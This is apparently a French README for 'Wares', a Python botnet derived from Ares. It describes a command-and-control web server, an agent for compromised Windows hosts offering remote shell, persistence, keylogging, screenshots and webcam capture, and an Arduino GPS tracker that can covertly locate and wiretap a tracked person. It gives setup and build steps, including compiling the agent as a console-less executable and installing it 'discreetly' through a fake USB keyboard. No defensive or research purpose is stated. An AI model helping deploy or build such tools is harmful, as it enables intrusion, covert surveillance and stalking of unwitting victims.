english version coming soooooooooon

# Wares
[![](https://img.shields.io/badge/style-python-blue.svg?label=server)](#serveur) [![](https://img.shields.io/badge/style-html-orange.svg?label=server)](#serveur) [![](https://img.shields.io/badge/style-css-4B0082.svg?label=server)](#serveur)   [![](https://img.shields.io/badge/style-python-blue.svg?label=agent)](#agent)   [![](https://img.shields.io/badge/style-arduino-ff69b4.svg?label=tracker)](https://github.com/EzLucky/Arduino_Gps_Tracker)


Wares, basé sur le projet [Ares](https://github.com/sweetsoftware/Ares), est un botnet codé en Python (version 2.7) sous le modèle d’une API RESTful.

Wares est composé de trois programmes :
* Un **serveur Command aNd Control**, qui est une interface Web permettant d’administrer les agents
* Un **programme agent**, qui est lancé sur l’hôte compromis, et assure la communication avec le CNC pour récupérer les commandes à exécuter, et retourner leurs résultats. Trois agents sont disponibles pour les différents OS : Windows, Unix (#TODO), OSX (#TODO)
* Un **traceur GPS** fonctionnant sur Arduino, envoyant au CNC les données de géolocalisation récoltées

L’interface Web peut être lancée sur n’importe quel serveur exécutant Python. Mais elle nécessite d’installer le package python cherrypy.

Le client est un programme Python dépendant d’un certain nombre de librairies python spécifiques à chaque OS. Il doit être compilé comme exécutable pour l’OS désiré, pour cela l’utilisation de PyInstaller est recommandée. Les fonctionnalités supportées sont : 
* shell distant
* persistance
* upload/download de fichier
* screenshot
* keylogger
* photo via webcam

Le traceur GPS est un dispositif collectant des données de géolocalisation (latitude, longitude, heure du relevé).  
Réalisé avec une Arduino UNO, un shield Adafruit FONA 808 v2, une antenne GPS passive uFl 15*15mm, une antenne gsm uFl et une batterie 1100mAh.  
Il est possible de réaliser certaines actions grâce à l’envoi d’un sms particulier via le téléphone autorisé vers la carte sim du traceur : demande d’appel afin de mettre sur écoute la personne tracée, demande de la localisation actuelle, mise à jour du mode de fonctionnement (envoi à la demande des données de localisation sur le téléphone autorisé, et envoi automatique des données de localisation sur le téléphone autorisé) et mise à jour de l’intervalle d’envoi. 

## Installation

### Serveur

Pour commencer, il faut installer le package python **cherrypy**.

Il faut ensuite créer la **base de données sqlite3**. Elle contiendra le mot de passe pour accéder à l’interface Web ainsi que toutes les données des agents (ID, OS, last online time, commandes, résultats, coordonnées gps [traceur]). Pour cela il suffit de lancer le script db_init.py :
```
cd server/

python db_init.py
```

Pour **lancer le serveur**, il ne reste plus qu’à rentrer la commande :
```
python server.py
```

Par défaut, le serveur écoute sur [http://localhost:8080](http://localhost:8080). Pour le modifier il faut éditer server/conf/server.conf.

### Agent

L’agent peut être lancé comme script python, mais son but final est d’être compilé comme exécutable.  
Premièrement, **installer** toutes les dépendances python :
* requests
* pythoncom
* pyhook
* PIL
* videocapture (http://videocapture.sourceforge.net/)

Ensuite, **configurer** agent/settings.py :
* SERVER_URL = URL du serveur http CNC
* BOT_ID = le nom (unique) du bot, laisser vide pour utiliser le hostname de la machine
* DEBUG = afficher les messages de debug ? (cas de l’agent en version console) 
* IDLE_TIME = temps d’inactivité avant de rentrer dans le mode idle. (l’agent contacte le CNC  beaucoup moins souvent quand il est en mode idle) (en secondes)
* REQUEST_INTERVAL = intervalle entre chaque requête vers le CNC quand il est en mode actif (en secondes)
* PAUSE_AT_START = délai avant de contacter le CNC au lancement (en secondes)
* AUTO_PERSIST = activer la persistance par défaut ?

Finalement, utiliser [PyInstaller](https://github.com/pyinstaller/pyinstaller) pour **compiler** l’agent en un unique fichier exécutable :
```
cd agent/python

C:/path/to/pyinstaller --onefile --noconsole agent.py
```

Pour installer l'agent sur un ordinateur rapidement et discrètement voir projet [faux clavier avec Arduino](https://github.com/EzLucky/Arduino_Fake_Keyboard)

### Traceur

Voir projet [traceur gps avec Arduino](https://github.com/EzLucky/Arduino_Gps_Tracker)

